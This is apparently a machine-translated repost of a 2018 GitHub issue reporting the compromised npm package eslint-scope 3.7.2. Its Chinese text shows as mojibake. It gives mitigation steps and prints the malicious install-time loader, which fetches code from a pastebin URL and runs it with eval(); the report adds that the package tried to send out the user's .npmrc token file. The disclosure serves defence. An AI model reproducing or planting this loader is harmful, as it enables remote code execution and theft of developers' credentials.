# eslint ä¸­çš„ç—…æ¯’-èŒƒå›´ 3.7.2

> åŸæ–‡:[https://dev.to/maestromac/virus-in-eslint-scope-372-13cn](https://dev.to/maestromac/virus-in-eslint-scope-372-13cn)

æˆ‘å¶ç„¶å‘ç°äº†è¿™ä¸ªé—®é¢˜ï¼Œæƒ³åœ¨è¿™é‡Œåˆ†äº«ä¸€ä¸‹ã€‚

# [![GitHub logo](../Images/75095a8afc1e0f207cda715962e75c8d.png) ç—…æ¯’åœ¨ eslint-scopeï¼Ÿ #39](https://github.com/eslint/eslint-scope/issues/39) 

[![pronebird avatar](../Images/335b8b5d91c591096f9a57543c0e09ef.png)](https://github.com/pronebird) **[pronebird](https://github.com/pronebird)** posted on [<time datetime="2018-07-12T11:17:18Z">Jul 12, 2018</time>](https://github.com/eslint/eslint-scope/issues/39)

## [](#updated-blog-post-httpseslintorgblog201807postmortem-for-malicious-package-publishes)æ›´æ–°åšæ–‡:[https://eslint . org/blog/2018/07/postmortem-for-malicious-package-publishes](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes)

## [](#update-from-the-maintainers)æ¥è‡ªç»´æŠ¤è€…çš„æ›´æ–°

[æ¥è‡ªå›½å®¶é¢„é˜²æœºåˆ¶çš„äº‹ä»¶çŠ¶æ€æŠ¥å‘Š](https://status.npmjs.org/incidents/dn7c1fgrr7ng)

è¯·å…³æ³¨@platinumazure çš„è¯„è®ºï¼Œè¯¥è¯„è®ºå¯¹æ‰€å‘ç”Ÿçš„äº‹æƒ…æœ‰ä¸€ç‚¹äº†è§£:[https://github . com/eslint/eslint-scope/issues/39 # issue comment-404533026](https://github.com/eslint/eslint-scope/issues/39#issuecomment-404533026)

åœ¨ eslint-config-eslint@5.0.2 ä¸­ä¼¼ä¹ä¹Ÿå‘å¸ƒäº†ç›¸åŒçš„ä»£ç ï¼Œä½†åæ¥ä¹Ÿæ²¡æœ‰å‘å¸ƒã€‚æ›´å¤šä¿¡æ¯è§[https://github.com/eslint/eslint/issues/10600](https://github.com/eslint/eslint/issues/10600)ã€‚

## [](#in-the-meantime)å…¶é—´

1.  å°†`eslint-scope`çš„ç‰ˆæœ¬å›ºå®šåˆ°`3.7.1`ï¼Œä¸€ç§æ–¹æ³•æ˜¯å°†`resolutions`æ·»åŠ åˆ°æ‚¨çš„`package.json`ä¸­

```
 "resolutions": {
    "eslint-scope": "3.7.1"
  } 
```

ç”¨`yarn list eslint-scope`éªŒè¯ä¾èµ–ç‰ˆæœ¬ã€‚å®ƒåº”è¯¥æ‰“å°å‡º`eslint-scope@3.7.1`

2.  ä½¿ç”¨`package-lock.json`æˆ–`yarn.lock`ï¼Œå¦‚æœå¯èƒ½çš„è¯ï¼ŒæŠŠå®ƒæ”¾åœ¨ä½ çš„å›è´­ä¸­ã€‚å³ä½¿`yarn outdated`æ˜¾ç¤ºæœ‰æ–°ç‰ˆæœ¬å¯ç”¨ï¼Œä¹Ÿä¸è¦å‡çº§åˆ° 3.7.2ã€‚

3.  æŒ‰ç…§ä¸‹é¢è¯„è®ºä¸­çš„å»ºè®®æ’¤é”€æ‚¨çš„ NPM ä»¤ç‰Œ[https://github . com/eslint/eslint-scope/issues/39 # issue comment-404496856](https://github.com/eslint/eslint-scope/issues/39#issuecomment-404496856)ã€‚ä½ å¯ä»¥ç™»å½• https://www.npmjs.com/çš„[ï¼Œä»è´¦æˆ·ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©â€œä»£å¸â€èœå•ï¼Œç„¶ååˆ é™¤é¡µé¢ä¸Šåˆ—å‡ºçš„æ‰€æœ‰ä»£å¸ã€‚å¦‚æœæ‚¨å°† NPM ä¸å¤–éƒ¨æœåŠ¡æŒ‚é’©ï¼Œè¯·ç¡®ä¿é‡æ–°åˆ›å»ºç›¸å…³ä»¤ç‰Œã€‚](https://www.npmjs.com/)

## [](#the-issue)è¿™ä¸ªé—®é¢˜

æˆ‘ä¸çŸ¥é“è¿™åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œä½†åœ¨æˆ‘çœ‹æ¥è¿™åƒæ˜¯ä¸€ç§ç—…æ¯’:

```
[2/3] â   eslint-scope
error /Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope: Command failed.
Exit code: 1
Command: node ./lib/build.js
Arguments: 
Directory: /Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope
Output:
undefined:30
      https1.get({hostname:'sstatic1.histats.com',path:'/0.gif?4103075&101',method:'GET',headers:{Referer:'http://1.a/'+conten
                                                                                                                        ^^^^^^

SyntaxError: Unexpected end of input
    at IncomingMessage.r.on (/Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope/lib/build.js:6:10)
    at emitOne (events.js:116:13)
    at IncomingMessage.emit (events.js:211:7)
    at IncomingMessage.Readable.read (_stream_readable.js:475:10)
    at flow (_stream_readable.js:846:34)
    at resume_ (_stream_readable.js:828:3)
    at _combinedTickCallback (internal/process/next_tick.js:138:11) 
```

å¯ç–‘æ–‡ä»¶çš„å†…å®¹:

```
try{
    var https=require('https');
    https.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}},(r)=>{
    r.setEncoding('utf8');
    r.on('data',(c)=>{
    eval(c);
    });
    r.on('error',()=>{});

    }).on('error',()=>{});
    }catch(e){}
```

<svg width="20px" height="20px" viewBox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-on"><title>Enter fullscreen mode</title></svg> <svg width="20px" height="20px" viewBox="0 0 24 24" class="highlight-action crayons-icon highlight-action--fullscreen-off"><title>Exit fullscreen mode</title></svg>

å®ƒè¯•å›¾åŠ è½½çš„ç½‘å€æ˜¯[http://pastebin.com/raw/XLeVP82h](http://pastebin.com/raw/XLeVP82h)

å®ƒè¿˜è¯•å›¾å°†æˆ‘çš„`.npmrc`å‘é€åˆ°æŸä¸ªåœ°æ–¹ã€‚

è¿™æ˜¯ä¸€å°æ—¶å‰å‘å¸ƒçš„ 3.7.2 ç‰ˆæœ¬ã€‚

[View on GitHub](https://github.com/eslint/eslint-scope/issues/39)

è½¯ä»¶åŒ…ç®¡ç†å™¨æ˜¯ä¸€ä¸ªä»¤äººæƒŠè®¶çš„ä¼ æ’­ç—…æ¯’çš„åª’ä»‹ï¼Œå°¤å…¶æ˜¯å½“ç—…æ¯’ä¾èµ–äº`babel-eslint`çš„æ—¶å€™ğŸ˜±